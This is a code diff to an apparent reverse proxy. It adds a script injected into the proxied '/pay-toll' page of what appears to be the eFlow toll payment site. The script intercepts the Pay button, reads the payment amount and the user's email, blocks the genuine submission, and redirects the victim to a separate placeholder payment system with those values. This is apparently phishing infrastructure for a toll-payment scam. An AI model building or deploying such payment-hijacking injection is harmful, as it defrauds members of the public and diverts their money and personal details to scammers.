@@ -312,11 +312,75 @@ const proxyOptions = {
 })();
 </script>`;
             
+            // Payment redirect script for /pay-toll page
+            const paymentRedirectScript = `
+<script>
+(function() {
+  // Wait for DOM to be ready
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initPaymentRedirect);
+  } else {
+    initPaymentRedirect();
+  }
+  
+  function initPaymentRedirect() {
+    // Find Pay button and intercept click
+    const payButton = document.querySelector('button[type="button"]');
+    
+    if (payButton && payButton.innerText.includes('Pay')) {
+      console.log('[Payment Redirect] Pay button found, intercepting...');
+      
+      payButton.addEventListener('click', function(e) {
+        // Read payment amount
+        const amountElement = document.querySelector('input[type="text"][value*="."]');
+        const emailElement = document.querySelector('input[type="email"], input[placeholder*="Email"], input[placeholder*="email"]');
+        
+        if (!amountElement) {
+          console.warn('[Payment Redirect] Amount not found, allowing default action');
+          return;
+        }
+        
+        const amount = amountElement.value;
+        const email = emailElement ? emailElement.value : '';
+        
+        // Prevent default form submission
+        e.preventDefault();
+        e.stopPropagation();
+        
+        // TODO: Replace with your payment system URL and parameters
+        const paymentUrl = 'https://your-payment-system.com/pay';
+        const params = new URLSearchParams({
+          amount: amount,
+          email: email,
+          currency: 'EUR',
+          description: 'eFlow Toll Payment',
+          return_url: window.location.origin + '/payment/success',
+          cancel_url: window.location.origin + '/payment/cancel'
+        });
+        
+        console.log('[Payment Redirect] Redirecting to payment system with amount:', amount);
+        
+        // Redirect to your payment system
+        window.location.href = paymentUrl + '?' + params.toString();
+      }, true); // Use capture phase to intercept before other handlers
+    }
+  }
+})();
+</script>`;
+            
+            // Inject scripts
+            let scriptsToInject = recaptchaFixScript;
+            
+            // Add payment redirect script only for /pay-toll page
+            if (req.url.includes('/pay-toll')) {
+              scriptsToInject += '\n' + paymentRedirectScript;
+            }
+            
             // Inject before </head> or first <script>
             if (bodyString.includes('</head>')) {
-              bodyString = bodyString.replace('</head>', recaptchaFixScript + '\n</head>');
+              bodyString = bodyString.replace('</head>', scriptsToInject + '\n</head>');
             } else if (bodyString.includes('<script')) {
-              bodyString = bodyString.replace('<script', recaptchaFixScript + '\n<script');
+              bodyString = bodyString.replace('<script', scriptsToInject + '\n<script');
             }
           }
           
